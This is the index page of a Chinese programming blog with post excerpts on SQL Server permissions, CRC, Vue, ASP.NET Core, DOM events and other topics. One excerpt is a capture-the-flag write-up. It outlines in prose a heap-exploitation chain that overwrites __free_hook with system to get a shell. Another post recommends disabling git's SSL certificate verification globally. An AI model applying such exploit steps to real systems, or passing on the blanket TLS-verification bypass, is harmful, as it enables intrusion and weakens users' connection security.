<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ad070d34199de92a3f846b263e576c2/" rel="bookmark">
			SQLSERVER新增账户指定浏览表或视图权限配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在项目上，甲方让提供一组数据给第三方使用，最后决qi定使用sqlserver视图的形式供其使用，那么势必会给对方一个链接我们项目数据库的账号，且该账号还需要有相应的select权限。
新增链接数据库账号步骤如下：
，安全和状态 都默认即可。
一定要注意用户映射那一步要选中一个数据库，不然这个账号登陆不了，会报错；
最后用此账号 可登录成功。
然后在管理员账号下将指定的视图或表的select权限分配给刚才新增的账号：
配置详细的权限:
最后登录刚才的账号，即可在视图的地方看到刚才被分配的视图。
**注：这里有个问题，就是如果视图中有其它架构（例：dbo,dbo2）时，需要该账号配上相应架构的权限，否则，select该视图时会报错。
但是加上该架构的权限后，这个架构下的所有视图或表都暴露在这个账号下了，还是没有达到‘新建一个账号，然后只能看到一个视图的权限’这样的目的。如果哪位有相应的解决办法，欢迎指教!
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2249ff87b6612c1a0ce7fd7ee41180b8/" rel="bookmark">
			循环冗余校验码CRC原理与LFSR循环码编码器原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 产生原理1.1 CRC可检测的错误？1.2 CRC生成过程？1.3 接收过程？ 2 CRC 的计算2.1 手算2.1 在线计算器 3 Verilog 实现3.1 线性反馈移位寄存器（LFSR）循环码编码3.2 Verilog代码 1 产生原理 循环冗余校验码Cyclic Redundancy Check（CRC）
简介：在发送端根据要传送的K位二进制码序列，以一定的规则产生一个校验用的r位监督码（CRC码），附在信息后面组成n=k+r位的码发出去。这种编码也叫（n,k）码。对于一个给定的（n,k）码，存在一个高次幂为r的多项式G(x)，根据多项式G(x)可以生成k位信息的校验码，G(x)叫做这个CRC码的生成多项式, 生成多项式的最高位和最低位必是1。
1.1 CRC可检测的错误？ 突发长度小于n-k+1的突发错误；大部分突发长度等于n-k+1的突发错误，其中不可检出的占2-(n-k-1)；大部分突发长度大于n-k+1的突发错误，其中不可检出的占2-(n-k)；所有与许用码组 码距 小于dmin-1的错误及所有奇数个错误。 1.2 CRC生成过程？ 生成过程：发送信息C(x)左移r位，表示为C(x)×2r，C(x)右边空出的r位就是校验码的位置。通过C(x)×2r模2除以生成多项式G(x)得到的余数就是校验码。
1.3 接收过程？ 接收过程：
计算CRC比较。收到的二进制序列（信息码+循环码）除以多项式，如果余数为0，则说明传输过程无错误发生。 2 CRC 的计算 以输入数据0x5a，G(x)=x^8+x^2+x+1计算为例。
2.1 手算 首先了解模2运算：
模2加：0+0=0，0+1=1，1+1=0 -&gt; a(模2加)b = a⊕b
模2减：0-0=0，0-1=1，1-0=1，1-1=0 -&gt; a(模2减)b = a⊕b
模2乘：0×0=0，0×1=0，1×1=1
模2除：0/1=0，1/1=1
根据生成过程：C(x)×2^r模2除以生成多项式G(x)得到的余数就是校验码。
G(x)对应：0x107
运算过程减法为模2减，即异或运算。
设余数为R[8:0]，注意的是，当 R[7] 为1，下一商位为1，当 R[7] 为0，下一商位为0。
其他规则与正常二进制除法一致。
可以看到每次运算的结果：
输入位商余数000_0000_0000110_0110_1111000_0110_1111110_1011_1011110_0111_0001000_0111_0001110_1100_0011010_1000_0001 最终的到的余数为：0x81，即我们需要的CRC码，0x5a编码之后为 0x5a|0x81。
2.1 在线计算器 CRC（循环冗余校验）在线计算
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2249ff87b6612c1a0ce7fd7ee41180b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9047297e52f679749ed5a0154405495f/" rel="bookmark">
			vue 范围拖选插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：公司需要一个每半小时一个时间段的选择功能，共48个点，效果如下
深色代表选中，浅色代表不选
正题：
实现功能：
1、任意格数，只需要编辑json
2、自适应父元素宽度
3、鼠标快速移动流畅响应
4、滑动指示当前信息
需要解决的问题：
1、布局问题，这里直接选择流式布局，flex 菜鸟学习传送
2、如何拖选：鼠标按下开启拖选，鼠标抬起结束拖选，鼠标进入选中（反选）
3、鼠标移动过快，enter事件监听不到：判断当前拖选方向，记录上一次拖选经过的Id，范围选中
源码已上传 打开即用，如果帮到你了，给个星
gitee: https://gitee.com/tomato23132313/range-drag-selection
实现效果：
核心代码：
methods: { subenter: function (item) { //拖选中子元素 if (this.isDrop) { if (this.lastItemId != item.id) { var min = this.lastItemId &lt; item.id ? this.lastItemId : item.id; var max = this.lastItemId &lt; item.id ? item.id : this.lastItemId; if (this.lastItemId - item.id &lt; 0) { //正方向 for ( var i = min; i &lt; Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9047297e52f679749ed5a0154405495f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7cd2c02e8ffa79be8facdc9187ff052/" rel="bookmark">
			前端小作业～新东方顶部导航菜单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/858a5b0f6a5ef77999aad5fd0b87f149/" rel="bookmark">
			计算机图形学：3D坐标系及左右手坐标的转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在数学中，坐标系的Z在上面，而在计算机中由于计算机屏幕是一个平面，所以在屏幕上面2D图形向上为y轴，向右为x轴
3D图形中，Z轴向屏幕里面的或者向屏幕外面（在图像渲染中，实际上是一种渲染深度）
在计算机图形学中，将Z指向屏幕外面，可以理解为，Z越向外，图像越接近人
（在UE4中，ZOrder代表渲染层级，层级越高，优先渲染，可以覆盖住后面的物件）
在创建场景时候，需要确定确定好是左手坐标系还是右手坐标系，弄错可就对应不上了
左右手坐标系点的转换公式： 可以看到，做的转换，只是把点的z坐标取反，就可以将点从左手坐标系转换到右手坐标系
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00d0d51d087d6dcb7ce39c5ae7816a63/" rel="bookmark">
			OpenSSL SSL_read: Connection was reset, errno 10054的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 起因 执行git push 的时候遇到了’: OpenSSL SSL_read: Connection was reset, errno 10054，的错误提示
经过 这是服务器的SSL证书没有经过第三方机构的签署，所以报错。
错误原因可能是网络不稳定，连接超时造成的，如果你试了多次还是报这个错误，建议你执行下面的命令
解决办法 git config --global http.sslVerify "false" 或者在git配置文件中添加如下配置
[core] repositoryformatversion = 0 filemode = false bare = false logallrefupdates = true symlinks = false ignorecase = true [remote "origin"] url = https://github.com/xxx/Secondary-development-component.git fetch = +refs/heads/*:refs/remotes/origin/* [http] sslverify = false [https] sslverify = false 加入了这两句
[http] sslverify = false [https] sslverify = false 总结 遇到问题不要怕，先看看网上遇到的人这么搞定的，如果搞不定就把电脑砸了，那是不可以的，不要情绪用事，如果理性思考后觉得可以砸，那也不要砸，送人多好。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f041ea4d47b7b61ddfd512926beb566/" rel="bookmark">
			*CTF-2022 examination 题解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源文件：my_github
这是一道堆题，模拟了学生和老师的有趣生活。
在这里，老师能干的事情有：添加学生、评分（分数随机，通常不超过10分）、为某一个学生写评语、叫家长（删除学生）。学生能干的事情有：做题（在本赛题中没有用）、查看评语、祈祷、设置模式（在本赛题中没有用）、修改要操作的学号。其中学生祈祷后，老师评分时能够发现，并吐槽一下，额外减10分。如果学生查看自己的分数发现大于89分，则可以获得奖励：获取到该学生信息的堆块地址，以及对任意地址的值加1（这种奖励每位学生只能获得一次）。
首先，我们需要发现一个整型漏洞。注意到祈祷之后评分会额外扣10分，如果本来没有10分，扣除之后就成了负数。看一下汇编，这里的跳转指令用的是jbe，也就是无符号整数的比较，这样就形成了一个整型漏洞。扣这10分之后，我们就可以进行任一地址加1的操作了。这是本题中最为关键的操作，没有之一。
在本题中，首先我们要获取libc的加载地址，好定位system函数。由于本题使用的glibc版本为2.31，因此任何小于0x400的chunk在释放时都会被存储到tcache中，而tcache chunk中并不包含任何glibc的偏移地址。这样，我们是无法知道glibc的偏移的。要想获得glibc地址，我们需要让一个chunk进入unsorted bin。这就需要使这个chunk的大小超过0x400。我们手中能用的手段只有任一地址加1，因此顺理成章地我们可以将这里的地址改大为0x500，这样就能够获得一个unsorted bin chunk了。
但是，如果仅仅是单纯地这样修改，我们仍然无法对这个chunk进行有效地控制。因为free意味着删除学生，程序中删除学生会将对应位置的悬挂指针清零，使我们看上去失去了UAF的可能性。但是别忘了，任一地址加1也是一个很好的攻击武器。如果我们通过任意地址加1能够修改一个学生评语的指针，那会怎么样呢？我们可以让两个学生的评语指向同一个位置，这样就实现了UAF。
经过实际验证，发现本程序中有很多需要注意的细节问题，需要把握好这些细节才能够拿到shell，否则程序容易崩溃退出。
1. 学生数量问题
从添加学生的程序中看出，学生最多只能有7个，而删除学生能够让计数器减1。
2. 评分问题
在评分的函数中，我们发现了一个程序bug。
假如我们现在已经有了7名学生，删除第1名学生，其指针会变成空指针，计数器的值应为6。但是评分遍历时还是会遍历到第1名学生，就会导致段错误。为了防止这种情况的发生，我们每一次删除一名学生都必须删除最后一名学生。
3. 地址写
在任意地址写程序中，我们需要输入一个地址的10进制数。但是出题人在处理这个10进制数的时候没有处理好。本来read函数读取到换行结束，出题人应该是想把换行改成空字符，但是很不巧的是他改错了，将最后一位数字改成了空字符。这就需要我们每一次输入地址的时候都要在后面多输入一位无效数字，在比赛的时候这个小bug造成了一些不必要的时间浪费。（屑出题人）
4. calloc
本题中除了teacher端输入6调用了一个malloc之外，其他的内存分配均使用calloc，而calloc不会分配tcache中的chunk。
注意到上面的限制条件之后，我们可以对步骤细化：
Step 1: 构造学生4的评语在学生5、6评语之后，绕过删除评语5的检查
Step 2: 奖励学生4，将学生5、6的评语（原大小：0x400）指向同一位置
Step 3: 奖励学生6，使学生6评语大小改大0x100（利用学生6的奖励机会）
Step 4: 删除学生6
Step 5: 读取学生5评语获取libc地址
Step 6: 将学生6添加回来
Step 7: 用学生5覆写学生6的chunk指针到__free_hook
Step 8: 为学生6写评语’/bin/sh’
Step 9: 在__free_hook写入system地址
Step 10: 用学生5覆写学生6的chunk指针返回到原来的位置
Step 11: 删除学生6，getshell
这里需要明确一点：在glibc 2.31的地盘，想要分配一个chunk到__free_hook是一件很难的事情。因为在分配前会对目标地址进行一系列的检查，具体参见我的how2heap学习第9篇文章。由于本题使用calloc作为内存分配函数，因此将tcache指针指向__free_hook也是无效的。因此，本题需要转换思路，直接修改写入评语的地址到__free_hook，即上述第7步。
在上面的思路中，第10步运用了calloc函数的特性，需要我们对本程序堆内存的分配情况有充分的了解，下面进行解释：
在bss段有一个长度为7的数组，存放学生信息的chunk指针，为描述方便，将这个数组中指针指向的chunk称为pointer chunk。每一个pointer chunk的大小均为0x30，其中只保存一个堆chunk指针，这个chunk指针指向的chunk保存的是该学生的分数、是否已经领取奖励的标志位、评语的chunk（以下称comment chunk）、评语chunk的长度等信息，大小为0x20，称其为header chunk（实际分配为0x18，最后8字节与后一个chunk的prev_size重合）。由于每一次添加学生时，两个chunk先后被分配，因此在一开始，不妨将7个学生均分配一次，这样堆空间中就会存在7个这样的结构：
在后面，是我们申请的评语的chunk，一开始我们会申请3个评语chunk，大小分别为0x100,0x400,0x200，分别给学生5,6,4。其中学生5分配0x100是为了后续步骤中将学生5的评语指针修改至与学生6重合。
由于在后期将学生6的chunk size改大0x100后需要free，因此在学生4的comment chunk中需要进行一定的构造以绕过检查。在学生4的comment chunk对应位置构造假chunk，这个假chunk头应该在学生6的comment chunk扩大0x100后其尾部的正后方，也即学生4 comment chunk头部向后偏移0x100处，构造如下内容：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f041ea4d47b7b61ddfd512926beb566/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0333a6de869885d988ffd10f31490f9/" rel="bookmark">
			深入探究ASP.NET Core读取Request.Body的正确方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 相信大家在使用ASP.NET Core进行开发的时候，肯定会涉及到读取Request.Body的场景，毕竟我们大部分的POST请求都是将数据存放到Http的Body当中。因为笔者日常开发所使用的主要也是ASP.NET Core所以笔者也遇到这这种场景，关于本篇文章所套路的内容，来自于在开发过程中我遇到的关于Request.Body的读取问题。在之前的使用的时候，基本上都是借助搜索引擎搜索的答案，并没有太关注这个，发现自己理解的和正确的使用之间存在很大的误区。故有感而发，便写下此文，以作记录。学无止境，愿与君共勉。
常用读取方式 当我们要读取Request Body的时候，相信大家第一直觉和笔者是一样的，这有啥难的，直接几行代码写完，这里我们模拟在Filter中读取Request Body，在Action或Middleware或其他地方读取类似，有Request的地方就有Body，如下所示
public override void OnActionExecuting(ActionExecutingContext context) { //在ASP.NET Core中Request Body是Stream的形式 StreamReader stream = new StreamReader(context.HttpContext.Request.Body); string body = stream.ReadToEnd(); _logger.LogDebug("body content:" + body); base.OnActionExecuting(context); } 写完之后，也没多想，毕竟这么常规的操作，信心满满，运行起来调试一把，发现直接报一个这个错System.InvalidOperationException: Synchronous operations are disallowed. Call ReadAsync or set AllowSynchronousIO to true instead.大致的意思就是同步操作不被允许，请使用ReadAsync的方式或设置AllowSynchronousIO为true。虽然没说怎么设置AllowSynchronousIO，不过我们借助搜索引擎是我们最大的强项。
同步读取 首先我们来看设置AllowSynchronousIO为true的方式，看名字也知道是允许同步IO，设置方式大致有两种，待会我们会通过源码来探究一下它们直接有何不同，我们先来看一下如何设置AllowSynchronousIO的值。第一种方式是在ConfigureServices中配置，操作如下
services.Configure&lt;KestrelServerOptions&gt;(options =&gt; { options.AllowSynchronousIO = true; }); 这种方式和在配置文件中配置Kestrel选项配置是一样的只是方式不同，设置完之后即可，运行不在报错。还有一种方式，可以不用在ConfigureServices中设置，通过IHttpBodyControlFeature的方式设置，具体如下
public override void OnActionExecuting(ActionExecutingContext context) { var syncIOFeature = context.HttpContext.Features.Get&lt;IHttpBodyControlFeature&gt;(); if (syncIOFeature != null) { syncIOFeature.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0333a6de869885d988ffd10f31490f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa2d6f81eea60196deb91360b9edeb79/" rel="bookmark">
			PTA node.js的读取和输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言 前言 今天在写数据结构的作业的时候发现的
以下就是他的程序样例：
// 实例化fs模块 var fs = require('fs'); // 定义一个空字符串 var buf = ''; // 添加侦听器 // 当readable的事件触发时执行函数 process.stdin.on('readable', function() { //读取可用数据 var chunk = process.stdin.read(); if (chunk) buf += chunk.toString(); }); process.stdin.on('end', function() { // 将字符串的每一行进行划分 buf.split('\n').forEach(function(line) { var tokens = line.split(' ').map(function(x) { return parseInt(x); }); if (tokens.length != 2) return; console.log(tokens.reduce(function(a, b) { return a + b; })); }); }); 该样例的作用是读入整数a和b，然后输出它们的和
其中用的是node.js的读取方法，以前刷leetcode的时候没遇到过，故来记录一下
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4370142de457a3dd262014a66416d630/" rel="bookmark">
			webapi-方法监听-事件流-事件委托-常用鼠标键盘事件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
事件高级
1.传统的注册事件的方式特点
2.方法监听注册方式特点
1.方法监听的语法：
2.解绑事件
3.Dom事件流
4.事件对象
5.this和target的区别
6.阻止默认事件
8.事件委托
9.常用的鼠标事件
1.禁止鼠标右键菜单 2.禁止鼠标选中
3.鼠标移动 离开
10.常用的键盘事件
事件高级 事件注册：给元素添加事件或绑定事件
注册事件的方式有两种：传统注册方式 和 方法监听注册方式
1.传统的注册事件的方式特点 事件类型以on开头唯一性同一个元素的同一个事件只能绑定一次。多了会被下面的覆盖 2.方法监听注册方式特点 是W3c推荐的addEventListener()他是一个方法IE9之前不支持统一元素同意事件可以注册多个监听器。按照注册的顺序执行。 1.方法监听的语法： btn.addEventListener('事件类型', function(){ 执行内容 }); 2.解绑事件 &lt;body&gt; &lt;button&gt;按钮&lt;/button&gt; &lt;script&gt; var btn = document.querySelector('button'); btn.addEventListener('click', fn); function fn() { alert('我只出现一次'); btn.removeEventListener('click', fn) } &lt;/script&gt; &lt;/body&gt; 3.Dom事件流 事件流描述的是从页面中接收事件顺序。
捕获阶段（由上往下传播）目标阶段（找到目标）冒泡阶段（由下往上反应） 4.事件对象 document.addEventListener('click', function(e) {//e 就是事件对象 console.log(e.pageX); }); 我们可以把事件对象看作是一个形参，但是它不需要传递形参。他是事件的一系列相关数据的集合，跟事件相关（‘click’）如鼠标点击里会包含鼠标的相关信息，坐标等等
5.this和target的区别 target返回的是触发事件的对象，通俗来说就是点击的对象。
this是返回的绑定事件的对象。
6.阻止默认事件 e.prevenDefult()
var as = document.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4370142de457a3dd262014a66416d630/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cb2f391d6d79aba376eddce1a050abc/" rel="bookmark">
			WebAPi-增查删改
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.获取元素的方式
1.根据id名获取元素
2.根据标签名获取元素
3.根据类名获取元素
4.H5新增的获取元素的方法
5.获取特殊元素的方法
6.修改元素文本内容
7.修改图片路径src
8.修改表单元素属性
9.修改样式属性
10.事件三要素
doy02
1.自定义属性
2.排他思想
3.节点查找
4.创建节点添加节点删除节点克隆节点
5.三种动态创建元素的区别
1.获取元素的方式 1.根据id名获取元素 ​ document.getElementById('id名')
2.根据标签名获取元素 ​ document.getElemenstByTagName('标签名')
3.根据类名获取元素 ​ document.getElemenstByClassName('类名')
4.H5新增的获取元素的方法 document.querySelector('.类名/ #id名/ 标签名'/后代子代选择器)
document.querySelectorAll('.类名/ #id名/ 标签名'/后代子代选择器)
5.获取特殊元素的方法 document.body 获取body元素
document.documentElement 获取Html元素
6.修改元素文本内容 innerText
innerHTML
他两个的区别是：innerHTML是标准的 W3c发布的，而且他会识别html标签和空格。
7.修改图片路径src 1.刘德华张学友切换图片案例
&lt;style&gt; img { display: block; width: 200px; margin-top: 10px; } &lt;/style&gt; &lt;/head&gt; ​ &lt;body&gt; &lt;button id="ldh"&gt;刘德华&lt;/button&gt; &lt;button id="zxy"&gt;张学友&lt;/button&gt; &lt;img src="./images/ldh.jpg" alt=""&gt; &lt;script&gt; var ldh = document.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cb2f391d6d79aba376eddce1a050abc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f69f8da908c60ec8bc61dd53cdca3324/" rel="bookmark">
			vim使用正则表达式按照指定模式批量删除行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 如果希望在vim里面批量删除一些行，这些行包含共同的特点，比如说有一些字符或者函数是相同的，那么可以调用vim正则表达式方式进行批量删除。
删除包含某串字符的行 假如这些行包含一串字符 x1t27sadfu
在vim控制台中输入以下命令，将包含这串字符的行删除：
:g/x1t27sadfu/d 删除只包含空格的行或者空白行 :g/^\s*$/d 删除不包含某几串字符的行 比如要删除所有不包含"error" or “warn” or “fail” 的行：
:v/error\|warn\|fail/d 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ee0e0704e6e5f666fda510f93ec5acc/" rel="bookmark">
			Vue form-create的基本使用 和 自定义表单组件的数据通迅
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 由于之前有个Web项目，大部分都是表单，而且这些表单是通过请求后端接口返回的数据，动态生成对应的DOM(表单类型)，以及表单的初始数据渲染，和修改表单后的数据提交。
根据以上项目情况，所以这次就选择用form-create(表单生成器)来做，虽然它很强大，但项目UI样式是千变万化的，而这次项目的UI和form-create的UI有所不同，所以就使用了form-create提供的自定义表单组件（简单来说：就是js逻辑交互功能还是用form-create的，但UI样式是自己写的）这样一来就可以达到项目的需求了。
在1年前的某个项目中用到过，现在又遇到类似的项目了，关于form-create 自定义表单组件的写法有点忘记了，所以又回顾了一下，所以现在记录一下，以便于以后又再次又遇到类似的项目需求时，就手到擒来啦！！
OK，我们先来了解一下，form-create 是什么地干活，哈哈！
form-create （轻松搞定 form 表单，让你不再为表单而烦恼） form-create是一个具有动态渲染、数据收集、校验和提交功能的表单生成器（貌似只支持Vue，现在版本升到v2了）。
官网：form-create
form-create 是一个可以通过 JSON数据生成具有动态渲染、数据收集、验证和提交功能的表单生成器，并且支持生成任何 Vue 组件。结合内置17种常用表单组件和自定义组件，再复杂的表单都可以轻松搞定。
form-create中内置表单类型： hidden、input、inputNumber、checkbox、radio、switch、select、autoComplete、cascader。 colorPicker、datePicker、timePicker、rate、slider、upload、tree、frame、group。 form-create的安装： 1、一般在安装form-create之前，要先创建好vue项目 和 安装UI(这里以element-ui为例)框架哦。
// 1、用 vue-cli（Vue脚手架工具） 来创建项目 vue create my-project // 回车后 根据提示选项，配置路由、状态管理、样式等。 // 2、安装ElementUI框架 cd my-project // 进入项目根目录 npm i element-ui -S // 安装ElementUI框架 2、form-create 和UI框架配合使用，目前支持3个常用的UI：ElementUI、Iview、Ant-design-vue，以下3种任选一种安装都OK(由于上面之前安装的UI框架是element-ui，所以就用@form-create/element-ui)【注：除创建项目以外，安装其他所有插件都要在项目根目录(和package.json同级的目录)中，打开命令窗口来执行相应安装命令才行哦！！】。
1、ElementUI npm i @form-create/element-ui 2、Iview 4.x npm i @form-create/iview4 3、Ant-design-vue 1.5.3+ npm i @form-create/ant-design-vue 3、在项目根目录src目录下的 main.js文件 中配置element-ui和form-create
import Vue from 'vue' // 引入element-ui UI框架 import ElementUI from "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ee0e0704e6e5f666fda510f93ec5acc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b92d77cb2b184675f22137f6d0fa1179/" rel="bookmark">
			Python初学之简单输出函数和数值类型运算实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.在屏幕上输出'Hello, World!'
print('Hello, World!') 运行结果如下
2.用户输入一个浮点数，用str.format格式化输出，保留3位小数。
print("请输入一个浮点数") n = float(input()) print("保留三位小数结果是") print('{:.3f}'.format(n)) 运行结果如下
3.模仿以下代码，增加输入部分，输入姓名，在屏幕上输出“欢迎你,某某某”（其中某某某用输入的姓名替换）
name = '李明' print('Hello',name) # 输出: Hello 李明
s = input() print('欢迎你,{}'.format(s)) 运行结果如下
4.在三行中依次分别输入年、月、日的整数值，按要求分行依次完成如下输出。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬
1 输出年月日，空格分隔，格式：2020 09 16‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬
2 输出年-月-日，连字符“-”分隔，格式：2020-09-16‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬
3 输出年/月/日，斜线“/”分隔，格式：2020/09/16‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬
4 输出月，日，年，逗号“,”分隔，格式：09,16,2020‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬
5 用str.format()格式输出，格式：2020年09月16日‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬
6 用字符串拼接方法输出，格式：2020年09月16日
#输入年 月 日 year=input() month=input() day=input() #按要求输出 #1 输出年月日，空格分隔，格式：2020 09 16‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬ print(year,month,day) #2 输出年-月-日，连字符“-”分隔，格式：2020-09-16‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬ print(year,month,day,sep='-') #3 输出年/月/日，斜线“/”分隔，格式：2020/09/16‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬ print(year,month,day,sep='/') #4 输出月，日，年，逗号“,”分隔，格式：09,16,2020‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬ print(month,day,year,sep=',') #5 用str.format()格式输出，格式：2020年09月16日‪‬‪‬‪‬‪‬‪‬‮‬‪‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬ print('{}年{}月{}日'.format(year,month,day)) #6 用字符串拼接方法输出，格式：2020年09月16日 print(year+'年'+month+'月'+day+'日') 运行结果如下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b92d77cb2b184675f22137f6d0fa1179/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5920dd122f345413080626092d4d1910/" rel="bookmark">
			Spring系列之自动注入（autowire）详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文内容 手动注入的不足
Class.isAssignableFrom方法介绍
3种自动注入方式详解及案例
按名称自动注入
按类型自动注入
按构造器进行自动注入
按类型自动注入某种类型的所有bean给List和Map（重点）
autowire=default介绍
总结
案例源码
手动注入的不足 上篇文章中介绍了依赖注入中的手动注入，所谓手动注入是指在xml中采用硬编码的方式来配置注入的对象，比如通过构造器注入或者set方法注入，这些注入的方式都存在不足，比如下面代码：
public class A{ private B b; private C c; private D d; private E e; .... private N n; //上面每个private属性的get和set方法 } 使用spring容器来管理，xml配置如下：
